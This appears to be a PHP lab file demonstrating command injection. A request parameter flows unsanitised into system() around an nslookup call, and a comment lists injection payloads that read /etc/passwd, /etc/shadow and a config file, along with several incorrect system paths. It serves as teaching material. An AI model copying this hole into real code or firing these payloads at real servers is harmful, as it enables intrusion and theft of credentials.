<?php
/**
 * Created by PhpStorm.
 * User: user1
 * Date: 1/26/14
 * Time: 3:30 PM
 */



   $host = 'google';
   if (isset( $_GET['host'] ) )
       $host = $_GET['host'];
   system("nslookup " . $host);
?>

<form method="get">
    <select name="host">
        <option value="google.com">google</option>
        <option value="yahoo.com">yahoo</option>
    </select>
    <input type="submit">
</form>

<!--
http://localhost/Injection/cmd_inj.php?host=google.com;ls
ls /tmp

cat /etc/passwd
cat /etc/shadow
cat /etc/urandom
cat /etc/proc/cpuinfo
cat /etc/system_profiler
uname -a
id
whoami
//semicolon separated
uname -a;id;cat /etc/system_profiler

http://localhost/cse5324/photos/command_injection.php?host=google.com;tail%20../config.php


-->